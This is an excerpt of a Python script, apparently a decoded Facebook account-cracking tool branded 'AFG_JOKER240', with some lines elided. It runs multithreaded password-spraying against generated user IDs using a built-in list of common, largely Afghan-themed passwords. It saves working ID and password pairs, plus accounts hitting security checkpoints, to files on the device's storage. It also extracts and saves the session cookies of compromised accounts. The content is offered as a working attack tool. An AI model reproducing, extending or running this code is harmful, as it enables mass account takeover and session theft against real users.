#DECODE/BY/SaManDar
#AFG_JOKER240
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.AFG_JOKER240')
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [𝙃𝘼𝘾𝙆𝙀𝙍-𝙅𝙊𝙆𝙀𝙍-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [AFG_JOKER240-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/AFG_JOKER240-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [AFG_JOKER240-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/AFG_JOKER240-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/AFG_JOKER240-CP.txt','a').write(ids+'|'+pas+'\n')
...
def AFG():
		...
		with tred(max_workers=30) as FKING:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'afghanistan','Afghanistan','afghanistanafghan','khan12','mohammed','mohammed Arman','۱۲۳۴۵۶','۱٠٠۲٠٠','۳٠٠۴٠٠','۵٠٠۶٠٠','۷٠٠۸٠٠','۹٠٠٠۱٠٠٠','۱٠٠٠۲٠٠٠','۳٠٠٠۴٠٠٠','۵٠٠٠۶٠٠٠','۷٠٠٠۸٠٠٠','707070','Rizwan khan','Raees khan','Raees afghan','password','۵٠٠۵٠٠','Afghan','Afghan500600','Afghan King','Afghan000','Afghan Afghan','100200','500600','10002000','70007000','700700','100100','200200','50005000','500500')
...
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [𝙅𝙊𝙆𝙀𝙍-𝙃𝘼𝘾𝙆𝙀𝙍]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [𝙅𝙊𝙆𝙀𝙍==>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/AFG_JOKER240-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/AFG_JOKER240-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
